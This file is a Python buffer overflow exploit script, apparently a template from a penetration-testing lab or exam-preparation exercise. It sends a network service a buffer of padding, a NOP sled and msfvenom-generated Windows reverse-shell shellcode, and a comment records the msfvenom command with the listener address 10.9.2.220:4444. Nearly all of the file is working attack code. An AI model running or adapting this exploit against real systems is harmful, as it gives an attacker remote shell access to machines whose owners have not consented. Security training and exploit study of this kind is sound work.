#!/usr/bin/env python3

import socket
import constants

ip = constants.IP
port = constants.PORT

# msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.220 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
buf = (b"\xda\xd5\xbb\x4e\x6f\x83\xc8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
b"\x52\x31\x5e\x17\x03\x5e\x17\x83\x88\x6b\x61\x3d\xe8\x9c\xe7"
b"\xbe\x10\x5d\x88\x37\xf5\x6c\x88\x2c\x7e\xde\x38\x26\xd2\xd3"
b"\xb3\x6a\xc6\x60\xb1\xa2\xe9\xc1\x7c\x95\xc4\xd2\x2d\xe5\x47"
b"\x51\x2c\x3a\xa7\x68\xff\x4f\xa6\xad\xe2\xa2\xfa\x66\x68\x10"
b"\xea\x03\x24\xa9\x81\x58\xa8\xa9\x76\x28\xcb\x98\x29\x22\x92"
b"\x3a\xc8\xe7\xae\x72\xd2\xe4\x8b\xcd\x69\xde\x60\xcc\xbb\x2e"
b"\x88\x63\x82\x9e\x7b\x7d\xc3\x19\x64\x08\x3d\x5a\x19\x0b\xfa"
b"\x20\xc5\x9e\x18\x82\x8e\x39\xc4\x32\x42\xdf\x8f\x39\x2f\xab"
b"\xd7\x5d\xae\x78\x6c\x59\x3b\x7f\xa2\xeb\x7f\xa4\x66\xb7\x24"
b"\xc5\x3f\x1d\x8a\xfa\x5f\xfe\x73\x5f\x14\x13\x67\xd2\x77\x7c"
b"\x44\xdf\x87\x7c\xc2\x68\xf4\x4e\x4d\xc3\x92\xe2\x06\xcd\x65"
b"\x04\x3d\xa9\xf9\xfb\xbe\xca\xd0\x3f\xea\x9a\x4a\xe9\x93\x70"
b"\x8a\x16\x46\xd6\xda\xb8\x39\x97\x8a\x78\xea\x7f\xc0\x76\xd5"
b"\x60\xeb\x5c\x7e\x0a\x16\x37\x8b\xc2\x1a\x1b\xe3\xd6\x1a\xb2"
b"\xa8\x5f\xfc\xde\x40\x36\x57\x77\xf8\x13\x23\xe6\x05\x8e\x4e"
b"\x28\x8d\x3d\xaf\xe7\x66\x4b\xa3\x90\x86\x06\x99\x37\x98\xbc"
b"\xb5\xd4\x0b\x5b\x45\x92\x37\xf4\x12\xf3\x86\x0d\xf6\xe9\xb1"
b"\xa7\xe4\xf3\x24\x8f\xac\x2f\x95\x0e\x2d\xbd\xa1\x34\x3d\x7b"
b"\x29\x71\x69\xd3\x7c\x2f\xc7\x95\xd6\x81\xb1\x4f\x84\x4b\x55"
b"\x09\xe6\x4b\x23\x16\x23\x3a\xcb\xa7\x9a\x7b\xf4\x08\x4b\x8c"
b"\x8d\x74\xeb\x73\x44\x3d\x0b\x96\x4c\x48\xa4\x0f\x05\xf1\xa9"
b"\xaf\xf0\x36\xd4\x33\xf0\xc6\x23\x2b\x71\xc2\x68\xeb\x6a\xbe"
b"\xe1\x9e\x8c\x6d\x01\x8b")

prefix = bytes(constants.PREFIX, 'utf-8')
offset = constants.OFFSET
overflow = b"A" * offset
retn = b""
padding = b"\x90" * 16
payload = buf

buffer = prefix + overflow + retn + padding + payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer + b"\r\n")
  print("Done!")
except:
  print("Could not connect.")